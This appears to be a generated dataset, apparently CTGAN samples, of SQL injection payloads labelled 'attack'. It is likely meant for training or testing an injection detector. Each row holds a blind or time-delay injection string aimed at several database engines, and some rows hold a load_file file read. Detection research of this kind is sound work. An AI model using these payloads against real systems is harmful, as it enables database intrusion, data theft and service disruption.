id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001481,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,6.382493913476247
CTGAN_001482,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,5.782432416755665
CTGAN_001483,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,7.963478173332618
CTGAN_001484,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,6.482366081188201
CTGAN_001485,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,7.51153256507922
CTGAN_001486,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.677659798939299
CTGAN_001487,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,5.364227791864334
CTGAN_001488,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,5.542316787554548
CTGAN_001489,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,6.649392722859999
CTGAN_001490,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.3081538107067505
CTGAN_001491,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000075,6.327416270781469
CTGAN_001492,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000026,3.980787905082321
CTGAN_001493,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,6.219943983286073
CTGAN_001494,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,7.936016130032855
CTGAN_001495,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000070,6.8484567431623065
CTGAN_001496,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,8.152471008846318
CTGAN_001497,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,7.101310857995938
CTGAN_001498,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,8.28147883031916
CTGAN_001499,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,7.084894823551999
CTGAN_001500,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,6.28842999111459
CTGAN_001501,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,4.4907553111131575
CTGAN_001502,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,6.298362416649868
CTGAN_001503,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,6.159533471941384
CTGAN_001504,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000070,7.875432651314721
CTGAN_001505,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,6.426826529903445
CTGAN_001506,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,7.560644566016733
CTGAN_001507,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,7.915500530142005
CTGAN_001508,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,7.461641505680924
CTGAN_001509,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,6.285237894327224
CTGAN_001510,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,7.004366848270595
CTGAN_001511,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,5.891695573071379
CTGAN_001512,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,6.742336822606718
CTGAN_001513,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,5.575333533804068
CTGAN_001514,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000038,6.573930416488932
CTGAN_001515,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,6.356794348444497
CTGAN_001516,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.514621357949133
CTGAN_001517,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000077,7.176356372355458
CTGAN_001518,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,5.253813650480394
CTGAN_001519,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,7.112739055833176
CTGAN_001520,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,5.513804454329242
CTGAN_001521,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,7.004956640519109
CTGAN_001522,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,6.022330404486706
CTGAN_001523,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.286340857365562
CTGAN_001524,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000044,7.50647970259025
CTGAN_001525,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,5.908873920626022
CTGAN_001526,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000067,9.217041141835578
CTGAN_001527,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000055,5.9657331286064945
CTGAN_001528,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000072,6.290437637459112
CTGAN_001529,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,5.383563532317467
CTGAN_001530,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.724161980311081
CTGAN_001531,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000034,6.916982126306909
CTGAN_001532,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,7.125766372001139
CTGAN_001533,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000011,9.175486700901962
CTGAN_001534,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,5.467628469384169
CTGAN_001535,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,5.771844420023865
CTGAN_001536,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,7.3133148879180725
CTGAN_001537,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,6.594508499930532
CTGAN_001538,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000067,7.871754554542171
CTGAN_001539,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.4815527012432845
CTGAN_001540,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,6.8644615430067475
CTGAN_001541,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,7.178008213144454
CTGAN_001542,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,6.150758316873075
CTGAN_001543,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,6.2971253475820985
CTGAN_001544,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000047,6.571358165133925
CTGAN_001545,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000023,5.950759841998048
CTGAN_001546,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,4.734346597953975
CTGAN_001547,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.858646431356841
CTGAN_001548,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.195282034859685
CTGAN_001549,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000027,5.619661049384197
CTGAN_001550,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000070,8.95741353624699
CTGAN_001551,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,7.900798952592786
CTGAN_001552,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,5.573252514128109
CTGAN_001553,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,6.0920646955327244
CTGAN_001554,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,7.3838454329031045
CTGAN_001555,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,6.436444948935791
CTGAN_001556,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,7.22092950715948
CTGAN_001557,attack,boolean,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",nearest_attack_euclidean,R000012,5.515670101991503
CTGAN_001558,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000019,7.2171899871232466
CTGAN_001559,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,6.281658338863259
CTGAN_001560,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,6.116072981732525
CTGAN_001561,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,7.7118622943666875
CTGAN_001562,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.579494774925257
CTGAN_001563,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,8.493851330102943
CTGAN_001564,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,7.22727167563819
CTGAN_001565,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000078,10.946580294827934
CTGAN_001566,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000077,8.429946563536882
CTGAN_001567,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,5.844672504912384
CTGAN_001568,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,7.617867156420353
CTGAN_001569,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,6.475706554895202
CTGAN_001570,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000011,7.338658570081833
CTGAN_001571,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,5.8950989604089425
CTGAN_001572,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000046,6.59056858731699
CTGAN_001573,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.9934385159380765
CTGAN_001574,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000067,7.690953641144398
CTGAN_001575,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,6.411829443701624
CTGAN_001576,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000032,5.762701169770015
CTGAN_001577,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,7.546474223230399
CTGAN_001578,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000074,5.57455032524589
CTGAN_001579,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,4.554324573477794
CTGAN_001580,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,6.407344587551706
CTGAN_001581,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000041,7.780884204639551
CTGAN_001582,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000060,7.345831679935626
CTGAN_001583,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000064,7.6489746319864915
CTGAN_001584,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,8.32279100702228
CTGAN_001585,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,7.786293558914807
CTGAN_001586,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,7.409193557819975
CTGAN_001587,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,6.4587067426380065
CTGAN_001588,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,6.661613371969437
CTGAN_001589,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,8.120188457427703
CTGAN_001590,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,6.475589472032008
CTGAN_001591,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000062,5.715640437657058
CTGAN_001592,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000078,6.425189268470723
CTGAN_001593,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,7.067255624358892
CTGAN_001594,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000027,7.0728175634574315
CTGAN_001595,attack,boolean,"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000066,7.6312030448959085
CTGAN_001596,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.917552674705697
CTGAN_001597,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,7.114206071232016
CTGAN_001598,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000004,6.0978862187341605
CTGAN_001599,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,6.729272736428421
CTGAN_001600,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,6.260226482285635
CTGAN_001601,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000011,7.524097204629482
CTGAN_001602,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.437698690735769
CTGAN_001603,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,5.7430574897496385
CTGAN_001604,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,6.84006418023777
CTGAN_001605,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,7.44836343242691
CTGAN_001606,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000010,10.27801972903569
CTGAN_001607,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000068,6.698430180872958
CTGAN_001608,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,7.812894283337863
CTGAN_001609,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000028,7.839744938686125
CTGAN_001610,attack,boolean,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',nearest_attack_euclidean,R000040,8.308614089311853
CTGAN_001611,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.4273033303844045
CTGAN_001612,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000053,6.170249314520297
CTGAN_001613,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,4.974641595470608
CTGAN_001614,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000042,5.61560895240116
CTGAN_001615,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000006,10.193057619925657
CTGAN_001616,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000026,7.492452662028533
CTGAN_001617,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000046,7.6630642381284915
CTGAN_001618,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,6.42073641483617
CTGAN_001619,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000021,6.677692041128308
CTGAN_001620,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000069,6.12539795614819
CTGAN_001621,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000048,8.398569922673804
CTGAN_001622,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,7.173634174321707
